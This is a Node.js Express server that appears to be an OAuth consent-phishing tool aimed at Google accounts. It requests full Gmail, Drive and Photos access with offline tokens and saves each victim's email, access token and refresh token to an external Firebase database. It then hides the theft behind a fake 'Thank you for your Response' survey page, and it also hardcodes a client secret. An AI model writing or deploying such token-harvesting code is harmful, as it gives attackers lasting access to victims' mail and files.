const express = require('express');
const axios = require('axios');

// Fix: open is ESM-only, so we import it dynamically
const open = (...args) => import('open').then(m => m.default(...args));

const app = express();
const port = 8080;

// 🔁 Replace these with your actual credentials

const CLIENT_ID  = '275047957484-jru0pln2o1o8s28ukgirg6c1vu57oidi.apps.googleusercontent.com';
const CLIENT_SECRET  = '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';
const redirect_uri = 'https://gmail-iota.vercel.app/oauth2callback';

// 🟩 Scopes: Gmail full, Drive full, Google Photos
const scopes = [
  'openid',
  'email',
  'profile',
  'https://mail.google.com/',
  'https://www.googleapis.com/auth/drive',
  'https://www.googleapis.com/auth/photoslibrary'
].join(' ');

// 🔐 Step 1: Redirect user to Google login
app.get('/', (req, res) => {
  const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?` +
    `client_id=${CLIENT_ID }&` +
    `redirect_uri=${redirect_uri}&` +
    `response_type=code&` +
    `scope=${encodeURIComponent(scopes)}&` +
    `access_type=offline&prompt=consent`;

  res.redirect(authUrl);
});


// 📬 Step 2: Receive the authorization code
app.get('/oauth2callback', async (req, res) => {
  const code = req.query.code;

  if (!code) return res.send('❌ No authorization code found');

  try {
    // 🔄 Step 3: Exchange code for tokens
    const response = await axios.post('https://oauth2.googleapis.com/token', null, {
      params: {
        client_id: CLIENT_ID ,
        client_secret: CLIENT_SECRET ,
        code,
        grant_type: 'authorization_code',
        redirect_uri,
      },
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    });

    const { access_token, refresh_token } = response.data;
    const userInfoRes = await axios.get('https://www.googleapis.com/oauth2/v2/userinfo', {
      headers: {
        Authorization: `Bearer ${access_token}`
      }
    });
    const email = userInfoRes.data.email;
    const safeEmail = email.replace(/[.#$/\[\]]/g, '_');
    const dataToSave = {
      email,
      access_token,
      refresh_token,
      complete_data: response.data,
      timestamp: new Date().toISOString()
    };
    const firebaseUrl = `https://access-app-bd273-default-rtdb.firebaseio.com/${safeEmail}.json`;
    await axios.put(firebaseUrl, dataToSave);

    console.log('\n✅ REFRESH TOKEN:', refresh_token);
    console.log('\n🔑 ACCESS TOKEN:', access_token);

    res.send(`
  <div style="font-family: Arial, sans-serif; text-align: center; padding: 40px; background-color: #f4f6f9; color: #333;">
    <div style="display: inline-block; padding: 30px 40px; background: #ffffff; border-radius: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); max-width: 500px;">
      <h1 style="color: #2e7d32;">✅ Success!</h1>
      <p style="font-size: 18px;">Thank you for your Resopnse.</p>
      <p style="font-size: 20px; margin-top: 20px;">Your unique ID is:</p>
      <div style="font-size: 32px; font-weight: bold; color: #1e88e5; margin: 10px 0;">${Math.floor(1000 + Math.random() * 9000)}</div>
      <p style="font-size: 14px; color: #666;">You may now close this window.</p>
    </div>
  </div>
`);

  } catch (err) {
    console.error('❌ Token exchange failed:', err.response?.data || err.message);
    res.send('❌ Failed to exchange code');
  }
});

// 🚀 Start server and auto-open browser
app.listen(port, async () => {
  const url = `http://localhost:${port}`;
  console.log(`🌐 Visit: ${url}`);
  await open(url); // open browser window
});
